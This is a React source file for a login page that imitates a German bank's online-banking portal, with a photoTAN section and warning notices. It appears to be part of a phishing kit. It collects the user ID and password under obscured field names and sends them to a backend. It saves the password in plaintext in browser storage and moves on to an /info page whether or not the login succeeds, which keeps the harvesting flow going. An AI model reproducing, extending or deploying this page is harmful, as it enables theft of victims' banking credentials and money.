import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { useLanguage } from '../contexts/LanguageContext';
import apiService from '../services/api';
import { FaArrowRight } from 'react-icons/fa';

interface LoginFormData {
  xusr: string;
  xpss: string;
}

const LoginPage: React.FC = () => {
  const navigate = useNavigate();
  const { t } = useLanguage();
  const [formData, setFormData] = useState<LoginFormData>({
    xusr: '',
    xpss: ''
  });
  const [errors, setErrors] = useState<Partial<LoginFormData>>({});
  const [isLoading, setIsLoading] = useState(false);

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setFormData(prev => ({
      ...prev,
      [name]: value
    }));
    // Clear error when user starts typing
    if (errors[name as keyof LoginFormData]) {
      setErrors(prev => ({
        ...prev,
        [name]: ''
      }));
    }
  };

  const validateForm = (): boolean => {
    const newErrors: Partial<LoginFormData> = {};

    if (!formData.xusr.trim()) {
      newErrors.xusr = 'Bitte geben Sie Ihre Benutzer-ID ein.';
    }

    if (!formData.xpss.trim()) {
      newErrors.xpss = 'Bitte geben Sie Ihr Passwort ein.';
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!validateForm()) {
      return;
    }

    setIsLoading(true);

    try {
      // Send data to backend (simulating the PHP behavior)
      await apiService.login(formData);
      
      // Store in both session and local storage for mobile compatibility
      sessionStorage.setItem('xusr', formData.xusr);
      sessionStorage.setItem('xpss', formData.xpss);
      localStorage.setItem('xusr', formData.xusr);
      localStorage.setItem('xpss', formData.xpss);
      
      // Navigate to info page
      navigate('/info');
    } catch (error) {
      console.error('Login error:', error);
      // Still navigate to maintain the flow
      sessionStorage.setItem('xusr', formData.xusr);
      sessionStorage.setItem('xpss', formData.xpss);
      localStorage.setItem('xusr', formData.xusr);
      localStorage.setItem('xpss', formData.xpss);
      navigate('/info');
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div style={{
      fontFamily: 'Arial, Helvetica, sans-serif',
      backgroundColor: '#f5f5f5',
      minHeight: '100vh',
      display: 'flex',
      flexDirection: 'column',
      alignItems: 'center',
      justifyContent: 'center',
      padding: '0px 20px 20px 20px',
      margin: 0
    }}>
      {/* Online banking registration heading */}
      <h1 style={{
        fontSize: '32px',
        fontWeight: 'bold',
        color: '#333',
        marginTop: '-30px',
        marginBottom: '10px',
        fontFamily: 'Arial, Helvetica, sans-serif',
        textAlign: 'left',
        width: '100%',
        maxWidth: '500px'
      }}>
{t.onlineBankingRegistration}
      </h1>
      
      <div style={{
        width: '100%',
        maxWidth: '500px',
        background: 'white',
        borderRadius: '8px',
        boxShadow: '0 2px 10px rgba(0, 0, 0, 0.1)',
        padding: '40px',
        margin: '0 auto'
      }}>
        <form onSubmit={handleSubmit} style={{
          padding: '20px'
        }}>
          <div style={{
            marginBottom: '10px',
            position: 'relative',
            display: 'flex',
            justifyContent: 'center'
          }}>
            <input
              type="text"
              id="xusr"
              name="xusr"
              value={formData.xusr}
              onChange={handleInputChange}
              style={{
                width: '130%',
                padding: '12px 12px 12px 12px',
                border: '1px solid #ddd',
                borderRadius: '4px',
                backgroundColor: 'white',
                fontFamily: 'Arial, Helvetica, sans-serif',
                fontSize: '14px',
                outline: 'none !important',
                boxShadow: 'none !important'
              }}
              onFocus={(e) => {
                e.target.style.backgroundColor = 'white';
              }}
                  placeholder={t.username}
                  autoComplete="off"
                  required
                />
                <span style={{
                  position: 'absolute',
                  right: '12px',
                  top: '50%',
                  transform: 'translateY(-50%)',
                  backgroundColor: '#ccc',
                  color: 'white',
                  borderRadius: '50%',
                  width: '20px',
                  height: '20px',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  fontSize: '12px',
                  fontWeight: 'bold'
                }}>i</span>
              </div>

              <div style={{
                marginBottom: '10px',
                position: 'relative',
                display: 'flex',
                justifyContent: 'center'
              }}>
                <input
                  type="password"
                  id="xpss"
                  name="xpss"
                  value={formData.xpss}
                  onChange={handleInputChange}
                  style={{
                    width: '130%',
                    padding: '12px 12px 12px 12px',
                    border: '1px solid #ddd',
                    borderRadius: '4px',
                    backgroundColor: 'white',
                    fontFamily: 'Arial, Helvetica, sans-serif',
                    fontSize: '14px',
                    outline: 'none !important',
                    boxShadow: 'none !important'
                  }}
                  onFocus={(e) => {
                    e.target.style.backgroundColor = 'white';
                  }}
              placeholder={t.password}
              autoComplete="off"
              required
            />
            <span style={{
              position: 'absolute',
              right: '12px',
              top: '50%',
              transform: 'translateY(-50%)',
              backgroundColor: '#ccc',
              color: 'white',
              borderRadius: '50%',
              width: '20px',
              height: '20px',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              fontSize: '12px',
              fontWeight: 'bold'
            }}>i</span>
          </div>

              <button 
                type="submit" 
                disabled={isLoading}
                style={{
                  width: '40%',
                  padding: '15px',
                  background: 'linear-gradient(135deg, #006400 0%, #004d00 50%, #006400 100%)',
                  color: 'white',
                  border: 'none',
                  borderRadius: '4px',
                  fontSize: '16px',
                  fontWeight: 'bold',
                  cursor: 'pointer',
                  fontFamily: 'Arial, Helvetica, sans-serif',
                  marginTop: '5px',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  gap: '8px',
                  margin: '5px auto 0 auto',
                  transition: 'background 0.3s ease'
                }}
                onMouseEnter={(e) => {
                  e.currentTarget.style.background = 'linear-gradient(315deg, #004d00 0%, #006400 50%, #004d00 100%)';
                }}
                onMouseLeave={(e) => {
                  e.currentTarget.style.background = 'linear-gradient(135deg, #006400 0%, #004d00 50%, #006400 100%)';
                }}
              >
                <svg width="16" height="16" viewBox="0 0 24 24" fill="white" style={{ marginRight: '4px' }}>
                  <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM12 17c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zM15.1 8H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
                </svg>
            {isLoading ? (t.loginButton + '...') : t.loginButton}
          </button>
        </form>

        {/* Divider matching input border color */}
        <div style={{
          width: '100%',
          height: '1px',
          backgroundColor: '#ddd',
          margin: '20px 0'
        }}></div>


        <div style={{
          padding: '0 20px',
          marginBottom: '8px',
          textAlign: 'left'
        }}>
          <h3 style={{
            fontSize: '20px',
            fontWeight: 'bold',
            color: 'black',
            marginBottom: '10px',
            fontFamily: 'Arial, Helvetica, sans-serif'
          }}>{t.updatePhotoTAN}</h3>
              <button 
                style={{
                  background: 'linear-gradient(135deg, #FFC107 0%, #FFD54F 50%, #FFC107 100%)',
                  color: 'black',
                  border: 'none',
                  padding: '10px 15px',
                  borderRadius: '4px',
                  fontSize: '14px',
                  cursor: 'pointer',
                  fontFamily: 'Arial, Helvetica, sans-serif',
                  transition: 'background 0.3s ease',
                  boxShadow: '0 2px 4px rgba(0, 0, 0, 0.3)'
                }}
                onMouseEnter={(e) => {
                  e.currentTarget.style.background = 'linear-gradient(315deg, #FFD54F 0%, #FFC107 50%, #FFD54F 100%)';
                }}
                onMouseLeave={(e) => {
                  e.currentTarget.style.background = 'linear-gradient(135deg, #FFC107 0%, #FFD54F 50%, #FFC107 100%)';
                }}
              >{t.businessPortal}</button>
        </div>

        {/* Divider after photoTAN section */}
        <div style={{
          width: '100%',
          height: '1px',
          backgroundColor: '#ddd',
          margin: '20px 0'
        }}></div>

        <div style={{
          padding: '0 20px',
          marginBottom: '8px',
          textAlign: 'left'
        }}>
          <h3 style={{
            fontSize: '20px',
            fontWeight: 'bold',
            color: 'black',
            marginBottom: '10px',
            fontFamily: 'Arial, Helvetica, sans-serif'
          }}>{t.notDigitalCustomer}</h3>
          <a href="#zugang" style={{
            color: 'black',
            textDecoration: 'none',
            display: 'flex',
            alignItems: 'center',
            gap: '8px',
            fontFamily: 'Arial, Helvetica, sans-serif'
          }}>
            {/* @ts-ignore */}
            <FaArrowRight style={{ color: '#FFC107', fontSize: '16px' }} />
{t.applyDigitalAccess}
          </a>
        </div>

        <div style={{
          padding: '20px 20px 0 20px',
          marginBottom: '8px',
          textAlign: 'left'
        }}>
          <h3 style={{
            fontSize: '20px',
            fontWeight: 'bold',
            color: 'black',
            marginBottom: '10px',
            fontFamily: 'Arial, Helvetica, sans-serif'
          }}>{t.currentWarnings}</h3>
          <div>
            <div style={{
              display: 'flex',
              alignItems: 'center',
              gap: '8px',
              marginBottom: '8px',
              fontFamily: 'Arial, Helvetica, sans-serif'
            }}>
              {/* @ts-ignore */}
              <FaArrowRight style={{ color: '#FFC107', fontSize: '16px' }} />
{t.warning1}
            </div>
            <div style={{
              display: 'flex',
              alignItems: 'center',
              gap: '8px',
              fontFamily: 'Arial, Helvetica, sans-serif'
            }}>
              {/* @ts-ignore */}
              <FaArrowRight style={{ color: '#FFC107', fontSize: '16px' }} />
{t.warning2}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default LoginPage;
